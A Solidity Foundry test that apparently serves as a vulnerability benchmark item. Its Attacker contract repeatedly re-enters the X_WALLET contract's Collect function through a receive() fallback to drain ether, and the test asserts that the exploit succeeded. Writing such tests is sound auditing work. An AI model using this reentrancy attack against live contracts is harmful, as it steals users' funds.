contract TestReentrancyX_WALLET is Test {
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain attackVal to be at least MinSum (1 ether) and avoid overflow
        vm.assume(attackVal >= 1 ether && attackVal <= 10 ether);

        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);

        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the test contract
        vm.deal(address(this), attackVal * 2);

        // Warp time forward to ensure unlockTime condition is satisfied
        vm.warp(block.timestamp + 1);

        // Setup: Attacker deposits funds into X_WALLET via Put()
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Execute the attack
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public _victim;

    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit funds into X_WALLET using Put() with unlockTime = 0 (immediately unlocked)
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedAttackVal = val;

        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Set exploitSucceeded if we re-entered more than once
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        
        if (reentrancyCount < 2) {
            // Re-enter the victim's Collect function
            // The balance check will still pass because state hasn't been updated yet
            if (address(_victim).balance >= storedAttackVal) {
                _victim.Collect(storedAttackVal);
            }
        }
        
        // Mark exploit as succeeded if we've re-entered
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }
}
